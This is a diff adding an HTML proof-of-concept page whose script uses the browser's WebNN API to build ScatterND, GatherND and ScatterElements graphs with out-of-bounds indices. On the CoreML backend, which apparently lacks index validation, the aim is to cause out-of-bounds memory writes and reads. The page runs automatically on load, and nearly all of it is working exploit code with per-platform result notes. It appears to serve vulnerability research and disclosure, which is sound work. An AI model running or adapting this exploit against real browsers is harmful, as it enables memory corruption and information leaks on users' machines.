@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+<head><title>WebNN ScatterND OOB Index PoC</title></head>
+<body>
+<h2>WebNN ScatterND Out-of-Bounds Index PoC</h2>
+<pre id="log"></pre>
+<script>
+function log(msg) {
+    document.getElementById('log').textContent += msg + '\n';
+    console.log(msg);
+}
+
+async function runPoC() {
+    log('=== WebNN ScatterND OOB Index PoC ===');
+    log('');
+
+    // Check WebNN availability
+    if (!navigator.ml) {
+        log('ERROR: WebNN not available (navigator.ml missing)');
+        log('Enable: chrome://flags/#web-machine-learning-neural-network');
+        return;
+    }
+
+    try {
+        // Create ML context
+        log('[*] Creating ML context...');
+        const context = await navigator.ml.createContext({deviceType: 'cpu'});
+        log('[+] Context created: ' + context);
+
+        const builder = new MLGraphBuilder(context);
+        log('[+] Graph builder created');
+
+        // === ScatterND with OOB indices ===
+        // Input: [4, 4] tensor (16 elements)
+        // Indices: [2, 1] with values [999, -999] — WAY out of bounds
+        // Updates: [2, 4] tensor
+        // Expected: OOB write if indices not validated
+
+        log('');
+        log('[*] Building ScatterND with OOB indices...');
+
+        const input = builder.input('input', {
+            dataType: 'float32',
+            shape: [4, 4]
+        });
+
+        // OOB indices — 999 is far beyond dimension size 4
+        const indicesData = new Int32Array([999, -999]);
+        const indices = builder.constant(
+            {dataType: 'int32', shape: [2, 1]},
+            indicesData
+        );
+        log('[+] Indices created with values: [999, -999] (OOB for dim size 4)');
+
+        const updatesData = new Float32Array([
+            1.0, 2.0, 3.0, 4.0,
+            5.0, 6.0, 7.0, 8.0
+        ]);
+        const updates = builder.constant(
+            {dataType: 'float32', shape: [2, 4]},
+            updatesData
+        );
+        log('[+] Updates created');
+
+        const output = builder.scatterND(input, indices, updates);
+        log('[+] ScatterND operation added to graph');
+
+        log('[*] Building graph...');
+        const graph = await builder.build({output});
+        log('[+] Graph built successfully');
+
+        // Create tensors for dispatch
+        const inputTensor = await context.createTensor({
+            dataType: 'float32',
+            shape: [4, 4],
+            usage: MLTensorUsage.WRITE | MLTensorUsage.READ
+        });
+
+        const outputTensor = await context.createTensor({
+            dataType: 'float32',
+            shape: [4, 4],
+            usage: MLTensorUsage.WRITE | MLTensorUsage.READ
+        });
+
+        // Write input data
+        const inputData = new Float32Array(16).fill(0);
+        await context.writeTensor(inputTensor, inputData);
+
+        log('[*] Dispatching graph (OOB indices reach backend)...');
+        log('[*] On CoreML (macOS): validate_indices=false → OOB WRITE');
+        log('[*] On TFLite (Linux): SerializeGatherIndices clamps → SAFE');
+
+        context.dispatch(graph, {input: inputTensor}, {output: outputTensor});
+
+        // Read output
+        const result = await context.readTensor(outputTensor);
+        const resultArray = new Float32Array(result);
+        log('[+] Output: ' + Array.from(resultArray));
+        log('');
+
+        // === Also test GatherND with OOB ===
+        log('[*] Building GatherND with OOB indices...');
+        const gatherInput = builder.input('gatherInput', {
+            dataType: 'float32',
+            shape: [4, 4]
+        });
+
+        const gatherIndicesData = new Int32Array([999, -1]);
+        const gatherIndices = builder.constant(
+            {dataType: 'int32', shape: [2, 1]},
+            gatherIndicesData
+        );
+
+        const gatherOutput = builder.gatherND(gatherInput, gatherIndices);
+        log('[+] GatherND with indices [999, -1] added');
+
+        const gatherGraph = await builder.build({output: gatherOutput});
+        log('[+] GatherND graph built');
+
+        const gInput = await context.createTensor({
+            dataType: 'float32', shape: [4, 4],
+            usage: MLTensorUsage.WRITE | MLTensorUsage.READ
+        });
+        const gOutput = await context.createTensor({
+            dataType: 'float32', shape: [2, 4],
+            usage: MLTensorUsage.WRITE | MLTensorUsage.READ
+        });
+
+        await context.writeTensor(gInput, new Float32Array(16).fill(42.0));
+
+        log('[*] Dispatching GatherND...');
+        log('[*] On CoreML: validate_indices=false → OOB READ (info leak)');
+        context.dispatch(gatherGraph, {gatherInput: gInput}, {output: gOutput});
+
+        const gResult = await context.readTensor(gOutput);
+        log('[+] GatherND output: ' + Array.from(new Float32Array(gResult)));
+        log('');
+
+        // === ScatterElements OOB ===
+        log('[*] Building ScatterElements with OOB indices...');
+        const seInput = builder.input('seInput', {
+            dataType: 'float32',
+            shape: [3, 3]
+        });
+
+        const seIndicesData = new Int32Array([0, 999, 0, 0, 0, -999, 0, 0, 0]);
+        const seIndices = builder.constant(
+            {dataType: 'int32', shape: [3, 3]},
+            seIndicesData
+        );
+
+        const seUpdatesData = new Float32Array([
+            1, 2, 3, 4, 5, 6, 7, 8, 9
+        ]);
+        const seUpdates = builder.constant(
+            {dataType: 'float32', shape: [3, 3]},
+            seUpdatesData
+        );
+
+        const seOutput = builder.scatterElements(
+            seInput, seIndices, seUpdates, {axis: 1}
+        );
+        log('[+] ScatterElements with index 999 on axis 1 (dim size 3)');
+
+        const seGraph = await builder.build({output: seOutput});
+        log('[+] ScatterElements graph built');
+
+        log('');
+        log('=== RESULTS ===');
+        log('On macOS (CoreML backend):');
+        log('  ScatterND/ScatterElements: validate_indices=false → OOB WRITE');
+        log('  GatherND/GatherElements:   validate_indices=false → OOB READ');
+        log('  5 operations affected at graph_builder_coreml.cc:3276,3318,3342,5285,5323');
+        log('');
+        log('On Linux (TFLite backend):');
+        log('  ScatterND: indices clamped by SerializeGatherIndices (CVE-2026-3914 fix)');
+        log('  GatherND: indices clamped (already had the fix pre-CVE)');
+        log('');
+        log('On Windows (DML backend):');
+        log('  ScatterND: indices passed directly to DirectML (no explicit validation)');
+        log('  GatherND: comment says "DirectML handles out-of-bounds internally"');
+
+    } catch (e) {
+        log('ERROR: ' + e.message);
+        log('Stack: ' + e.stack);
+        if (e.message.includes('not supported') || e.message.includes('NotSupported')) {
+            log('');
+            log('WebNN ScatterND may not be supported on this backend.');
+            log('The vulnerability exists in the CoreML backend code regardless.');
+        }
+    }
+}
+
+runPoC();
+</script>
+</body>
+</html>
